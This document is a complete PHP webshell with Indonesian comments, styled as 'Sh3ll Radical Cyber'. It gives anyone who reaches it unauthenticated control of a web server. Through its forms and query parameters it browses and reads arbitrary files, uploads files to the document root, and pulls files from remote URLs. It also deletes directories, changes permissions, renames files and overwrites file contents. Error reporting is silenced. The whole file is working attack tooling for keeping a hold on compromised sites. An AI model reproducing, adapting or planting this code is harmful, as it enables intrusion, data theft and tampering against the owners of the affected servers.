<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Sh3ll Radical Cyber</title>
<style>
body {
  background: radial-gradient(circle at top, #060312 0%, #030009 100%);
  color: #d8e2ff;
  font-family: "JetBrains Mono", monospace;
  margin: 0;
}
a { color: #00eaff; text-decoration: none; }
a:hover { color: #b66bff; }

table {
  width: 95%;
  border-collapse: collapse;
  margin: 20px auto;
  background: rgba(15, 10, 35, 0.9);
  border: 1px solid rgba(105, 90, 255, 0.3);
  border-radius: 6px;
  box-shadow: 0 0 15px rgba(100, 60, 255, 0.3);
}
th {
  background: linear-gradient(90deg,#240046,#0b0020);
  color: #bdfdff;
  padding: 10px;
  text-align: left;
  font-size: 14px;
  text-transform: uppercase;
}
td {
  padding: 8px 10px;
  border-top: 1px solid rgba(255,255,255,0.05);
  color: #e8e3ff;
  background: rgba(10, 5, 25, 0.4);
}
tr:hover td { background: rgba(130,50,255,0.1); }

input, select, textarea {
  background: #0b0b18;
  color: #bfefff;
  border: 1px solid rgba(160,90,255,0.3);
  border-radius: 4px;
  padding: 6px 8px;
}
input[type=submit], .up, .gas {
  background: linear-gradient(180deg,#140033,#09001a);
  color: #cce8ff;
  border: 1px solid #6c3aff;
  border-radius: 5px;
  padding: 6px 10px;
  cursor: pointer;
  text-shadow: 0 0 5px #6c3aff;
  transition: all .2s ease;
}
input[type=submit]:hover, .up:hover, .gas:hover {
  background: linear-gradient(180deg,#2a0080,#0b0033);
  color: #fff;
  box-shadow: 0 0 8px #7f3aff;
}
form {
  margin: 10px auto;
  background: rgba(25, 10, 45, 0.5);
  padding: 10px;
  border-radius: 6px;
  width: fit-content;
}
ul { list-style:none; padding:0; margin:10px; text-align:center; }
ul a { color:#b66bff; }

pre {
  background: #0a0616;
  color: #b5caff;
  padding: 10px;
  border-radius: 6px;
  overflow: auto;
  box-shadow: inset 0 0 10px rgba(150, 80, 255, 0.3);
}
.center { text-align:center; }
.footer {
  text-align:center;
  color:#8f8bbf;
  margin:20px 0;
  font-size:13px;
}
h3 {
  font-weight:600;
  color:#b6a1ff;
  text-shadow:0 0 6px #6f40ff;
}
</style>
</head>
<body>
<?php
// combined_shell_with_secure_remotedl.php
// Gabungan webshell (versi migrasi dari yang kamu kirim) + fitur remote download aman.
// CONFIG: ubah sebelum dipakai
define('REMOTE_DL_TOKEN', 'el');
define('REMOTE_DL_BASEDIR', __DIR__ . '/downloads'); // pindah ke luar public_html jika mungkin
$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
// END CONFIG

set_time_limit(0);
error_reporting(0);

// ----------------- Helper asli & util -----------------
function author() {
    echo "<center><br>SH3LL PR1V</center>";
    exit();
}

function xrmdir($dir) {
    $items = @scandir($dir);
    if (!$items) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir.'/'.$item;
        if (is_dir($path)) xrmdir($path);
        else @unlink($path);
    }
    @rmdir($dir);
}

function green($text) { echo "<center><font color='green'>{$text}</font></center>"; }
function red($text) { echo "<center><font color='red'>{$text}</font></center>"; }

function statusnya($file){
    $statusnya = @fileperms($file);
    if ($statusnya === false) return 'u???';
    if (($statusnya & 0xC000) == 0xC000) $ingfo = 's';
    elseif (($statusnya & 0xA000) == 0xA000) $ingfo = 'l';
    elseif (($statusnya & 0x8000) == 0x8000) $ingfo = '-';
    elseif (($statusnya & 0x6000) == 0x6000) $ingfo = 'b';
    elseif (($statusnya & 0x4000) == 0x4000) $ingfo = 'd';
    elseif (($statusnya & 0x2000) == 0x2000) $ingfo = 'c';
    elseif (($statusnya & 0x1000) == 0x1000) $ingfo = 'p';
    else $ingfo = 'u';
    $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0040) ? (($statusnya & 0x0800) ? 's' : 'x' ) : (($statusnya & 0x0800) ? 'S' : '-'));
    $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0008) ? (($statusnya & 0x0400) ? 's' : 'x' ) : (($statusnya & 0x0400) ? 'S' : '-'));
    $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0001) ? (($statusnya & 0x0200) ? 't' : 'x' ) : (($statusnya & 0x0200) ? 'T' : '-'));
    return $ingfo;
}

// ----------------- Secure remote download functions -----------------
function __download_log($entry){
    $logdir = REMOTE_DL_BASEDIR;
    if (!is_dir($logdir)) @mkdir($logdir,0755,true);
    $lf = rtrim($logdir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'dl.log';
    $line = json_encode($entry, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE) . PHP_EOL;
    @file_put_contents($lf, $line, FILE_APPEND | LOCK_EX);
}

function __download_secure($url, $optname = ''){
    global $REMOTE_DL_WHITELIST;
    $base = REMOTE_DL_BASEDIR;
    if (!is_dir($base)) {
        if (!@mkdir($base, 0755, true)) {
            return ['ok'=>false,'err'=>'Failed to create base dir','path'=>null];
        }
    }
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['ok'=>false,'err'=>'Invalid URL','path'=>null];
    }
    $host = parse_url($url, PHP_URL_HOST);
    if (!empty($REMOTE_DL_WHITELIST) && is_array($REMOTE_DL_WHITELIST)){
        $allowed = false;
        foreach($REMOTE_DL_WHITELIST as $d){
            if (stripos($host, $d) !== false) { $allowed = true; break; }
        }
        if (!$allowed) return ['ok'=>false,'err'=>'Domain not allowed by whitelist','path'=>null];
    }
    $remote_path = parse_url($url, PHP_URL_PATH) ?: '';
    $basename = basename(rawurldecode($remote_path)) ?: 'download.bin';
    $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
    if ($optname !== ''){
        $optname = basename($optname);
        $optname = preg_replace('/[^A-Za-z0-9._-]/','_',$optname);
        $filename = $optname;
    } else {
        $filename = $basename;
    }
    $target = realpath($base);
    if ($target === false) $target = $base;
    $target = rtrim($target, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
    $real_base = realpath($base);
    $real_target_dir = realpath(dirname($target)) ?: dirname($target);
    if ($real_base !== false && strpos($real_target_dir, $real_base) !== 0){
        return ['ok'=>false,'err'=>'Invalid target path','path'=>null];
    }
    $ok = false; $err = '';
    if (function_exists('curl_init')){
        $ch = curl_init($url);
        $fp = @fopen($target, 'w');
        if ($fp !== false){
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_FAILONERROR, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 90);
            curl_exec($ch);
            $cerr = curl_error($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            fclose($fp);
            if (!$cerr && $code < 400 && is_file($target)) $ok = true;
            else { @unlink($target); $err = $cerr ?: "HTTP {$code}"; }
        } else $err = 'Failed opening target for write';
    }
    if (!$ok){
        $ctx = stream_context_create(['http'=>['timeout'=>30],'https'=>['timeout'=>30]]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false){
            if (@file_put_contents($target, $data) !== false) $ok = true;
            else { @unlink($target); $err = 'Write failed'; }
        } else {
            if (!$err) $err = 'Download failed (no cURL and file_get_contents failed)';
        }
    }
    if ($ok) @chmod($target, 0644);
    __download_log([
        'time' => date('c'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'cli',
        'url' => $url,
        'target' => $target,
        'ok' => $ok ? 1 : 0,
        'err' => $ok ? '' : $err
    ]);
    return ['ok'=>$ok,'err'=>$err,'path'=>$target];
}

// ----------------- Integrasi UI remotedl ke webshell (fungsi pengganti alfaremotedl) -----------------
function alfaremotedl(){
    if(function_exists('alfahead')) alfahead();
    echo "<div style='background:#111;padding:12px;border-radius:8px;margin:8px;color:#dff;'>";
    echo "<h3 style='margin:6px 0;font-family:monospace;color:#0f9'>Upload From URL (secure)</h3>";
    $cwd = htmlspecialchars($GLOBALS['cwd'] ?? getcwd());
    echo "<form method='post' style='margin:8px 0;'>
        <label style='display:block;margin:6px 0;color:#9aa;'>Cmd (download &lt;url&gt; [filename])</label>
        <input type='text' name='cmd' style='width:80%;padding:8px;border-radius:4px;background:#222;color:#efe; border:1px solid #333;font-family:monospace' placeholder='download https://site.tld/file.ext optional_name.ext' required>
        <input type='hidden' name='dl_token' value='".htmlspecialchars(REMOTE_DL_TOKEN)."'>
        <div style='margin-top:8px;'><input type='submit' name='dl_submit' value='Download' style='padding:8px 12px;border-radius:4px;background:#0f9;color:#012;border:none;cursor:pointer'></div>
    </form>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dl_submit'])){
        $cmd = trim($_POST['cmd'] ?? '');
        $token = $_POST['dl_token'] ?? '';
        echo "<div style='margin-top:10px;padding:8px;background:#0b0c0d;border-radius:4px;'>";
        if ($token !== REMOTE_DL_TOKEN){
            echo "<div style='color:#f66'>Auth failed.</div>";
        } else {
            $parts = preg_split('/\s+/', $cmd, 3);
            if (count($parts) < 2 || strtolower($parts[0]) !== 'download'){
                echo "<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
            } else {
                $url = $parts[1];
                $optname = $parts[2] ?? '';
                $result = __download_secure($url, $optname);
                if ($result['ok']){
                    echo "<div style='color:#6f6'>Success: ".htmlspecialchars($result['path'])."</div>";
                } else {
                    echo "<div style='color:#f66'>Error: ".htmlspecialchars($result['err'])."</div>";
                }
            }
        }
        echo "</div>";
    }
    echo "<div style='margin-top:10px;color:#889; font-size:12px;'>Base dir: ".htmlspecialchars(REMOTE_DL_BASEDIR)." | Whitelist: ".htmlspecialchars(implode(',',$GLOBALS['REMOTE_DL_WHITELIST']))."</div>";
    echo "</div>";
    if(function_exists('alfafooter')) alfafooter();
}

// ----------------- Simple file manager UI (minimal, dari skrip asli) -----------------
foreach($_POST as $k=>$v) $_POST[$k]=stripslashes($v);

$k3yw = base64_decode(''); // tidak dipakai

if(isset($_GET['path'])){ $lokasi = $_GET['path']; $lokdua = $_GET['path']; }
else { $lokasi = getcwd(); $lokdua = getcwd(); }

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = @explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

echo "<center><font face='Bungee' size='5' color='#0f9'>Sh3ll</font></center>";
echo "<table width='700' border='0' cellpadding='3' cellspacing='1' align='center'><tr><td><br>";
echo "Directory : &nbsp;";

$cur = 'http://' . ($_SERVER['HTTP_HOST'] ?? 'cli') . ($_SERVER['REQUEST_URI'] ?? '');
foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){ echo '<a href="?path=/">/</a>'; continue; }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo rawurlencode($lokasis[$i]);
        if($i != $id) echo "/";
    } 
    echo '">'.$lok.'</a>/';
}
echo "</td></tr><tr><td><br>";

// upload form (file)
if (isset($_POST['upwkwk'])) {
    if (isset($_POST['berkasnya'])) {
        if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DOCUMENT_ROOT']; }
        $dst = $lokasi."/".$_FILES['berkas']['name'];
        $data = @file_put_contents($dst, @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($dst)) echo "File Uploaded ! &nbsp;<font color='gold'><i>".$dst."</i></font><br><br>";
        else echo "<font color='red'>Failed to Upload !<br><br>";
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) exit("Filename cannot be empty !");
        if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DOCUMENT_ROOT']; }
        $dst = $lokasi."/".$_POST['namalink'];
        $data = @file_put_contents($dst, @file_get_contents($_POST['darilink']));
        if (file_exists($dst)) echo "File Uploaded ! &nbsp;<font color='gold'><i>".$dst."</i></font><br><br>";
        else echo "<font color='red'>Failed to Upload !<br><br>";
    }
}

echo "<center>";
echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir
<input type="radio" value="2" name="dirnya" >document_root
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
</center>
</form>';
echo "</table>";
print "<center>";
print "<ul>";
print "[ <a href='?'>Home</a> ]";
print " [ <a href='?'>Tess</a> ]";
print " [ <a href='?act=remotedl'>RemoteDL</a> ]";
print "</ul>";
print "</center>";

// handle actions
if (isset($_GET['act']) && $_GET['act'] === 'remotedl') {
    alfaremotedl();
    exit;
}

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".htmlspecialchars($_GET['fileloc']);
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(@file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) red("Failed to delete Directory !");
        else green("Delete Directory Success !");
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) red("Failed to Delete File !");
        else green("Delete File Success !");
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', @fileperms($_POST['path'])), -4).'" />
    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
    <input type="hidden" name="pilih" value="ubahmod">
    <input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
    if (isset($_POST['chm0d'])) {
        $cm = @chmod($_POST['path'], intval($_POST['perm'], 8));
        if ($cm == true) green("Change Mod Success !");
        else red("Change Mod Failed !");
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) green("Change Name Success !");
        else red("Change Name Failed !");
    }
    $namaawal = empty($_POST['name']) ? $_POST['newname'] ?? '' : $_POST['name'];
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($namaawal).'" />
    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) green("Edit File Success !");
        else red("Edit File Failed !");
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" />
    </form><br>';
}

// directory & file listing
echo '<div style="max-width:900px;margin:14px auto;background:#0b0b0b;color:#def;padding:10px;border-radius:8px">';
echo '<table width="100%" cellpadding="6" cellspacing="1" style="border:1px solid #222">';
echo '<tr style="background:#132"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td></tr>';

if (is_array($lokasinya)){
    foreach($lokasinya as $dir){
        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
        echo "<tr style='background:#0d1'><td><a href=\"?path=".htmlspecialchars($lokasi."/".$dir)."\">".htmlspecialchars($dir)."</a></td><td><center>--</center></td><td><center>";
        if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
        elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
        echo statusnya($lokasi."/".$dir);
        if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
        echo "</center></td><td><center><form method=\"POST\" action=\"?pilihan&path=".htmlspecialchars($lokasi)."\">
        <select name=\"pilih\"><option value=\"\"></option><option value=\"hapus\">Delete</option><option value=\"ubahmod\">Chm0d</option><option value=\"gantinama\">Rename</option></select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"".htmlspecialchars($dir)."\">
        <input type=\"hidden\" name=\"path\" value=\"".htmlspecialchars($lokasi.'/'.$dir)."\">
        <input type=\"submit\" class=\"gas\" value=\">\" />
        </form></center></td></tr>";
    }
    echo '<tr style="background:#111"><td></td><td></td><td></td><td></td></tr>';
    foreach($lokasinya as $file) {
        if(!is_file("$lokasi/$file")) continue;
        $size = @filesize("$lokasi/$file")/1024;
        $size = round($size,3);
        if($size >= 1024) $size = round($size/1024,2).' MB'; else $size = $size.' KB';
        echo "<tr><td><a href=\"?fileloc=".htmlspecialchars($lokasi.'/'.$file)."&path=".htmlspecialchars($lokasi)."\">".htmlspecialchars($file)."</a></td>
        <td><center>".htmlspecialchars($size)."</center></td><td><center>";
        if(is_writable("$lokasi/$file")) echo '<font color="green">';
        elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
        echo statusnya("$lokasi/$file");
        if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
        echo "</center></td><td><center>
        <form method=\"post\" action=\"?pilihan&path=".htmlspecialchars($lokasi)."\">
        <select name=\"pilih\"><option value=\"\"></option>
        <option value=\"hapus\">Delete</option><option value=\"ubahmod\">Chm0d</option><option value=\"gantinama\">Rename</option><option value=\"edit\">Edit</option></select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"".htmlspecialchars($file)."\">
        <input type=\"hidden\" name=\"path\" value=\"".htmlspecialchars($lokasi.'/'.$file)."\">
        <input type=\"submit\" class=\"gas\" value=\">\" />
        </form></center></td></tr>";
    }
}

echo '</table></div>';

// akhir
author();
?>
